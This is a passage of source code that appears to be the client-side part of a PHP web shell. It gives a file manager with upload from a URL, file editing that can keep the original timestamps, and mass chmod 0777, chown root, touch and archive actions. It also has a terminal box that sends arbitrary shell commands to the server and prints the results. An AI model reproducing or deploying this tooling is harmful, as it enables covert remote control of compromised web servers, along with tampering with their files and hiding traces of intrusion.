	$('.ulurladd').append("<tr><td style='width:144px'>File URL</td><td><input type='text' class='ulFileUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToUrl' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr>");
}

function ul_start(formData, ulType, i){
	loading_start();
	$.ajax({
		url: targeturl,
		type: 'POST',
		data: formData,
		cache: false,
		contentType: false,
		processData: false,
		xhr: function(){
			myXhr = $.ajaxSettings.xhr();
			if(myXhr.upload){
				myXhr.upload.addEventListener('progress', function(e){
					percent = Math.floor(e.loaded / e.total * 100);
					$('.ulProgress'+ulType+i).html('( '+ percent +'% )');
				}, false);
			}
			return myXhr;
		},
		success: function(res){
			if(res.match(/Warning.*POST.*Content-Length.*of.*bytes.*exceeds.*the.*limit.*of/)){
				res = 'error';
			}

			if(res=='error'){
				$('.ulProgress'+ulType+i).html('( failed )');
			}
			else{
				$('.ulRes'+ulType+i).html(res);
			}
			loading_stop();
		},
		error: function(){
			loading_stop();
			$('.ulProgress'+ulType+i).html('( failed )');
			$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);
			$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i);
		}
	});
}

function ul_go(ulType){
	ulFile = (ulType=='comp')? $('.ulFileComp'):$('.ulFileUrl');
	ulResult = (ulType=='comp')? $('.ulCompResult'):$('.ulUrlResult');
	ulResult.html('');

	ulFile.each(function(i){
		if(((ulType=='comp')&&this.files[0])||((ulType=='url')&&(this.value!=''))){
			file = (ulType=='comp')? this.files[0]: this.value;
			filename = (ulType=='comp')? file.name: file.substring(file.lastIndexOf('/')+1);

			ulSaveTo = (ulType=='comp')? $('.ulSaveToComp')[i].value:$('.ulSaveToUrl')[i].value;
			ulFilename = (ulType=='comp')? $('.ulFilenameComp')[i].value:$('.ulFilenameUrl')[i].value;

			var formData = new FormData();
			formData.append('ulFile', file);
			formData.append('ulSaveTo', ulSaveTo);
			formData.append('ulFilename', ulFilename);
			formData.append('ulType', ulType);

			entry = "<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";
			ulResult.append(entry);

			check = true;
			if(ulType=='comp'){
				check = (file.size<=0);
			}
			else check = (file=="");

			if(check){
				$('.ulProgress'+ulType+i).html('( failed )');
				$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);
				$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i);
			}
			else{
				ul_start(formData, ulType, i);
			}
		}
	});
}

function trap_ctrl_enter(el, e, callback){
	if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
		if(callback!=null) window[callback]();
	}
	fix_tabchar(el, e);
}

function edit_save_raw(){
	edit_save('edit');
}

function edit_save_hex(){
	edit_save('hex');
}

function edit_save(editType){
	editFilename = $('#editFilename').val();
	editInput = $('#editInput').val();
	editSuccess = false;
	preserveTimestamp = 'false';
	if($('.cBox').hasClass('cBoxSelected')) preserveTimestamp = 'true';
	send_post({editType:editType,editFilename:editFilename,editInput:editInput,preserveTimestamp:preserveTimestamp},
		function(res){
			if(res!='error'){
				editSuccess = 'success';
				view(editFilename, editType, preserveTimestamp);
			}
			else editSuccess = 'error';
		}
		);
}



function mass_act(type){
	buffer = get_all_cbox_selected('xplTable', 'xpl_href');

	if((type=='cut')||(type=='copy')){
		localStorage.setItem('bufferLength', buffer.length);
		localStorage.setItem('bufferAction', type);
		$.each(buffer,function(i,v){
			localStorage.setItem('buffer_'+i, v);
		});
	}
	else if(type=='paste'){
		bufferLength = localStorage.getItem('bufferLength');
		bufferAction = localStorage.getItem('bufferAction');
		if(bufferLength>0){
			massBuffer = '';
			for(var i=0;i<bufferLength;i++){
				if((buff = localStorage.getItem('buffer_'+i))){
					massBuffer += buff + '\n';
				}
			}
			massBuffer = $.trim(massBuffer);

			if(bufferAction=='cut') title = 'move';
			else if(bufferAction=='copy') title = 'copy';

			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>"+title+" here</td><td><input type='text' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'mass_act_go_paste');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('paste');\">"+title+"</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}

	}
	else if((type=='extract (tar)')||(type=='extract (tar.gz)')||(type=='extract (zip)')){
		if(type=='extract (tar)') arcType = 'untar';
		else if(type=='extract (tar.gz)') arcType = 'untargz';
		else if(type=='extract (zip)') arcType = 'unzip';

		if(buffer.length>0){
			massBuffer = '';
			$.each(buffer,function(i,v){
				massBuffer += v + '\n';
			});
			massBuffer = $.trim(massBuffer);
			title = type;

			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Extract to</td><td><input class='massValue' type='text' value='"+html_safe(get_cwd())+"'  onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">extract</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}
	}
	else if((type=='compress (tar)')||(type=='compress (tar.gz)')||(type=='compress (zip)')){
		date = new Date();
		rand = date.getTime();
		if(type=='compress (tar)'){
			arcType = 'tar';
			arcFilename = rand+'.tar';
		}
		else if(type=='compress (tar.gz)'){
			arcType = 'targz';
			arcFilename = rand+'.tar.gz';
		}
		else if(type=='compress (zip)'){
			arcType = 'zip';
			arcFilename = rand+'.zip';
		}

		if(buffer.length>0){
			massBuffer = '';
			$.each(buffer,function(i,v){
				massBuffer += v + '\n';
			});
			massBuffer = $.trim(massBuffer);
			title = type;

			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Archive</td><td><input class='massValue' type='text' value='"+arcFilename+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">compress</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}
	}
	else if(type!=''){
		if(buffer.length>0){
			massBuffer = '';
			$.each(buffer,function(i,v){
				massBuffer += v + '\n';
			});
			massBuffer = $.trim(massBuffer);
			title = type;
			line = '';
			if(type=='chmod') line = "<tr><td class='colFit'>chmod</td><td><input class='massValue' type='text' value='0777' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
			else if(type=='chown') line = "<tr><td class='colFit'>chown</td><td><input class='massValue' type='text' value='root' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
			else if(type=='touch'){
				var now = new Date();
				line = "<tr><td class='colFit'>touch</td><td><input class='massValue' type='text' value='"+now.toGMTString()+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
			}

			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr>"+line+"<tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+type+"');\">"+title+"</span></td></tr></table>";
			show_box(ucfirst(title), content);
		}
	}

	$('.cBoxSelected').removeClass('cBoxSelected');
	xpl_update_status();
}

function mass_act_go_tar(){
	mass_act_go('tar');
}

function mass_act_go_targz(){
	mass_act_go('targz');
}

function mass_act_go_zip(){
	mass_act_go('zip');
}

function mass_act_go_untar(){
	mass_act_go('untar');
}

function mass_act_go_untargz(){
	mass_act_go('untargz');
}

function mass_act_go_unzip(){
	mass_act_go('unzip');
}

function mass_act_go_paste(){
	mass_act_go('paste');
}

function mass_act_go_chmod(){
	mass_act_go('chmod');
}

function mass_act_go_chown(){
	mass_act_go('chown');
}

function mass_act_go_touch(){
	mass_act_go('touch');
}

function mass_act_go(massType){
	massBuffer = $.trim($('.massBuffer').val());
	massPath = get_cwd();
	massValue = '';
	if(massType=='paste'){
		bufferLength = localStorage.getItem('bufferLength');
		bufferAction = localStorage.getItem('bufferAction');
		if(bufferLength>0){
			massBuffer = '';
			for(var i=0;i<bufferLength;i++){
				if((buff = localStorage.getItem('buffer_'+i))){
					massBuffer += buff + '\n';
				}
			}
			massBuffer = $.trim(massBuffer);
			if(bufferAction=='copy') massType = 'copy';
			else if(bufferAction=='cut') massType = 'cut';
		}
	}
	else if((massType=='chmod')||(massType=='chown')||(massType=='touch')){
		massValue = $('.massValue').val();
	}
	else if((massType=='tar')||(massType=='targz')||(massType=='zip')){
		massValue = $('.massValue').val();
	}
	else if((massType=='untar')||(massType=='untargz')||(massType=='unzip')){
		massValue = $('.massValue').val();
	}


	if(massBuffer!=''){
		send_post({massType:massType,massBuffer:massBuffer,massPath:massPath,massValue:massValue }, function(res){
			if(res!='error'){
				$('.boxresult').html(res+' Operation(s) succeeded');
			}
			else $('.boxresult').html('Operation(s) failed');
			navigate(get_cwd());
		});
	}
}

function xpl_update_status(){
	totalSelected = $('#xplTable').find('.cBoxSelected').not('.cBoxAll').length;
	if(totalSelected==0) $('.xplSelected').html('');
	else $('.xplSelected').html(', '+totalSelected+' item(s) selected');
}


function xpl_bind(){
	$('.navigate').off('click');
	$('.navigate').on('click', function(e){
		path = xpl_href($(this));
		navigate(path);
		hide_box();
	});

	$('.navbar').off('click');
	$('.navbar').on('click', function(e){
		path = $(this).attr('data-path');
		navigate(path);
		hide_box();
	});

	$('.newfolder').off('click');
	$('.newfolder').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		newfolder(path);
	});

	$('.newfile').off('click');
	$('.newfile').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		newfile(path);
	});

	$('.del').off('click');
	$('.del').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		del(path);
	});

	$('.view').off('click');
	$('.view').on('click', function(e){
		path = xpl_href($(this));
		view(path, 'auto');
		hide_box();
	});

	$('.hex').off('click');
	$('.hex').on('click', function(e){
		path = xpl_href($(this));
		view(path, 'hex');
	});

	$('#viewFullsize').off('click');
	$('#viewFullsize').on('click', function(e){
		src = $('#viewImage').attr('src');
		window.open(src);
	});

	$('.edit').off('click');
	$('.edit').on('click', function(e){
		path = xpl_href($(this));
		view(path, 'edit');
		hide_box();
	});

	$('.ren').off('click');
	$('.ren').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		ren(path);
	});

	$('.action').off('click');
	$('.action').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		action(path, 'file');
	});

	$('.actionfolder').off('click');
	$('.actionfolder').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		action(path, 'dir');
	});

	$('.actiondot').off('click');
	$('.actiondot').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		action(path, 'dot');
	});

	$('.dl').off('click');
	$('.dl').on('click', function(e){
		path = html_safe(xpl_href($(this)));
		$('#form').append("<input type='hidden' name='download' value='"+path+"'>");
		$('#form').submit();
		$('#form').html('');
		hide_box();
	});

	$('.ul').off('click');
	$('.ul').on('click', function(e){
		path = xpl_href($(this));
		navigate(path, false);
		path = html_safe(path);
		ul(path);
		hide_box();
	});

	$('.find').off('click');
	$('.find').on('click', function(e){
		path = xpl_href($(this));
		navigate(path, false);
		path = html_safe(path);
		find(path);
		hide_box();
	});

	$('#massAction').off('click');
	$('#massAction').on('change', function(e){
		type = $('#massAction').val();
		mass_act(type);
		$('#massAction').val('Action');
	});

	cbox_bind('xplTable','xpl_update_status');
}

function xpl_href(el){
	return el.parent().parent().attr('data-path');
}

function multimedia(path){
	var a = $('video').get(0);
	send_post({multimedia:path}, function(res){
		a.src = res;
	});
	hide_box();
}

$('#terminalInput').on('keydown', function(e){
	if(e.keyCode==13){
		cmd = $('#terminalInput').val();
		terminalHistory.push(cmd);
		terminalHistoryPos = terminalHistory.length;
		if(cmd=='clear'||cmd=='cls'){
			$('#terminalOutput').html('');
		}
		else if((path = cmd.match(/cd(.*)/i)) || (path = cmd.match(/^([a-z]:)$/i))){
			path = $.trim(path[1]);
			navigate(path);
		}
		else if(cmd!=''){
			send_post({ terminalInput: cmd }, function(res){
				cwd = html_safe(get_cwd());
				res = '<span class=\'strong\'>'+cwd+'&gt;</span>'+html_safe(cmd)+ '\n' + res+'\n';
				$('#terminalOutput').append(res);
				bottom = $(document).height()-$(window).height();
				$(window).scrollTop(bottom);
			});
		}
		$('#terminalInput').val('');
		setTimeout("$('#terminalInput').focus()",100);
	}
	else if(e.keyCode==38){
		if(terminalHistoryPos>0){
			terminalHistoryPos--;
			$('#terminalInput').val(terminalHistory[terminalHistoryPos]);
			if(terminalHistoryPos<0) terminalHistoryPos = 0;
		}
	}
	else if(e.keyCode==40){
		if(terminalHistoryPos<terminalHistory.length-1){
			terminalHistoryPos++;
			$('#terminalInput').val(terminalHistory[terminalHistoryPos]);
			if(terminalHistoryPos>terminalHistory.length) terminalHistoryPos = terminalHistory.length;
		}
	}
	fix_tabchar(this, e);
});


<?php
foreach($GLOBALS['module_to_load'] as $value){
	echo "function ".$GLOBALS['module'][$value]['id']."(){ ".$GLOBALS['module'][$value]['js_ontabselected']." }\n";
}
?>
</script>
<!--script end-->
</body>
</html><?php die();?>
